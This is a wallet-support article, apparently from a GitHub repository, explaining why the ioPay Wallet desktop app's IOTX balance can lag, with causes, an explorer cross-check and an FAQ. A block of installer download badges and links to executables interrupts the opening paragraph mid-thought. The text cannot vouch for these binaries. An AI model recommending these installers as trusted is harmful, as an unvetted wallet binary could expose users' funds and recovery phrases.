![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Balance Not Updating? Why the Number Is Behind

A balance in ioPay Wallet is not a record the app keeps. It is a **read of the chain**, fetched and cached. When it looks wrong, one of four things is happening: the cached view is stale, the app cannot reach a node, a transaction is still pending, or you are looking at a different account or a different kind of balance than you think.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

None of those is a lost balance. The chain does not forget, and the app cannot edit it.

## First: which balance?

Three numbers sit close together in a staking wallet, and only one of them is spendable:

- **Spendable IOTX** - what a transfer can use right now.
- **Staked IOTX** - delegated to a validator, locked for its duration. It shows as a position or bucket, not as a balance (F021).
- **Accrued rewards** - earned, not yet withdrawn.

If you staked recently, the spendable figure *should* have gone down, and the position figure up. That is the wallet working. The same is true in reverse when a stake is withdrawn: the spendable number only rises after the **withdraw** step, not after unstaking. [How unstaking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

## Then: which account?

One phrase can hold several accounts, each with its own `io1...` and `0x...` addresses. A balance that "vanished" is very often the other account - or the same account after an import created a second entry.

Switch accounts in the wallet and check the address the funds were sent to. If the receiving address does not match anything in your account list, you are looking at the wrong wallet, not a lost transfer.

## The four causes, in order of likelihood

**1. Stale view.** Reopen the app, or use the refresh the interface offers. A cached number lags a newly mined transaction by seconds to minutes, and the lag is normal.

**2. The app cannot reach a node.** If the balance is old *and* timestamps look wrong, this is the cause, not a display quirk. ["Error fetching timestamp"](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md) covers it - the fix is the network path, not the wallet.

**3. A transaction is still pending.** Funds committed to an unconfirmed send are typically not yet deducted - or deducted but not yet reflected. Either way the number is mid-flight. [Pending transactions](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md) explains the states and when to stop waiting; an exchange withdrawal is the case where this most often looks like a lost balance ([withdrawing from an exchange](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/withdrawing-iotx-from-an-exchange-to-iopay.md)).

**4. The build is old.** The problems users reported were fixed in **v2.0.2, 19 November 2026**; older builds can misread newer data. [Update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).

## The explorer cross-check

The decisive test, and it takes a minute: look up your address on an IoTeX explorer.

- **Explorer shows the expected balance, app does not** -> it is a display or sync problem. Refresh, check connectivity, update.
- **Explorer shows the same as the app** -> the app is right, and the difference is in what you expected: a pending send, a stake, a fee, or another account.
- **Explorer shows nothing at that address** -> the funds went to a different address. Check the transaction you sent from, and the address you gave out.

That last case is the one that needs the address-format page: `io1...` and `0x...` are the same account, but a *different* chain's address is not yours at all.

## What does not fix it

**Reinstalling.** The accounts live in the app's data; the balance lives on-chain. A reinstall changes neither, and if you reinstall without your phrase you have created a problem instead of solving one.

**Sending a test transaction.** It will not "wake up" a stale read; it just adds another transaction to interpret.

**Waiting days for a pending transfer.** A pending transaction either confirms or it does not. If it has been pending long past any plausible block time, treat it as [a stuck transaction](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md) rather than a slow balance.

## Related

- [Missing transaction history](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-missing-transaction-history.md) - when the balance is right but the list is not.

## FAQ

**Why is my ioPay balance not updating?**
Usually a stale cached view or an unreachable node. Less often a pending transaction holding the funds, or the wrong account selected. Cross-check on an explorer to see which.

**My staking rewards are not in my balance - are they missing?**
No. Rewards accrue to the staking position and are withdrawn with it. They are not part of the spendable balance until you withdraw.

**The explorer shows a different number. Which is right?**
The explorer is reading the chain directly; the app is reading a cache. If they disagree persistently, the app is behind - refresh, check connectivity, and update to v2.0.2.

**Could someone have taken my funds?**
If the explorer shows an outgoing transaction you did not sign, yes - that is the case to act on, and the answer is to move whatever remains to a new account with a new phrase. A balance that merely lags is not that.

## The balance that is right and still surprising

Some numbers are correct and unwelcome. A send that has just confirmed leaves the amount plus the fee gone, so the balance falls by more than the figure you typed. A stake moves value from spendable into a bucket. A bridge takes the source fee on this side.

Those are arithmetic, not errors, and the history list is where they reconcile: each row carries the amount and the fee. If the total after reading the history agrees with what the wallet shows, the display is doing its job and the surprise belongs to the expectation.

---

*Balances, history and staking positions are on-chain reads of IoTeX mainnet (chain ID 4689). The app's refresh and caching behaviour is described as it is observed, not as a specification claim.*
